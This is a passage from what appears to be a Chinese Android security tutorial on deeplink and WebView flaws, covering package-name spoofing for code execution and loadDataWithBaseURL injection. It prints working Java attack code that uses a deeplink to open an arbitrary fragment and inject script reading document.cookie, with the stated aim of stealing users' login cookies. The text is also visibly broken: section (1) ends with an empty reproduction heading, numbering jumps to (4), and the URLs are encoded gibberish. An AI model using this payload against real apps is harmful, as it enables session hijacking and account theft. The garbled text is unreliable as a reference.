### 5. Deeplink + WebView 漏洞

`deeplink` 是一种在网页中启动 App 的超链接。当用户点击 `deeplink` 链接时，Android 系统会启动注册该 `deeplink` 的应用，打开在 Manifest 文件中注册该 `deeplink` 的 `activity`。

`deeplink` 在 APP 中会导致多类漏洞：通过 `deeplink` 操纵 `WebView` 造成的远程代码执行、敏感信息泄露、应用克隆、`launchAnyWhere` 等漏洞。

#### （1）任意代码执行漏洞

**漏洞原理：**

样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，使应用触发任意代码执行漏洞。

**漏洞复现：**

#### （4）`loadDataWithBaseURL` 漏洞

当 `loadDataWithBaseURL` 的域名和内容同时可控时，可以构造任意域下的 XSS。

|  |  |
| --- | --- |
| 1 2 3 4 5 6 | `void loadDataWithBaseURL(String baseUrl, String data, String mimeType, String encoding, String historyUrl)` |

除了明显的情况外，攻击者控制调用中的 `baseUri` 和参数 `data`。

|  |  |
| --- | --- |
| 1 2 3 | `webView.loadDataWithBaseURL("d29K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1j5", "<script>document.write(document.domain)</script>", null, null, null);` |

**漏洞原理：**

`deeplink` 加载任意 fragment，转化为 `WebView` `loadDataWithBaseURL` 漏洞。

**漏洞复现：**

实现步骤：

|  |  |
| --- | --- |
| 1 2 3 4 | （1）`victim-app://c/contact/2?fragmen_class=<fragment>` 可启动任意 fragment，并可通过 `Intent Extra` 传参。<br>（2）寻找到一个带 `WebView` 的 Fragment：`GoogleMapWebViewFragment`。<br>（3）可污染 `loadDataWithBaseURL` 的前两个参数，构造 `victim.com` 域下的 XSS。<br>`webview.loadDataWithBaseURL("victim.com", "google-map.html", "text/html", ...);` |

攻击代码：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 | `Intent payload = new Intent(Intent.ACTION_VIEW);`<br>`payload.setData(Uri.parse("victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment"));`<br>`Bundle extra = new Bundle();`<br>`extra.putString("map_url", "\"></script><script>alert(document.cookie);</script><script>");`<br>`extra.putString("map_file_name", "google_map.html");`<br>`extra.putString("map_domain", "fe0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2$3K9h3y4@1K9h3#2Q4x3X3c8S2M7s2m8Q4x3X3g2U0L8$3@1");`<br>`payload.putExtra("bundle", extra);`<br>`startActivity(payload);` |

可以通过这个 `deeplink` 打开任意 fragment 的漏洞，实现可控任意域执行任意 JS，实现盗取登录态的用户 cookie！

具体参考：[Android 中的特殊攻击面（二）——危险的 deeplink](https://bbs.kanxue.com/elink@f8eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8U0R3I4e0s2q4Q4x3X3c8v1N6@1q4e0L8X3E0e0f1K6u0%4k6K6j5J5d9q4y4$3b7g2)9K6c8R3`.`.)
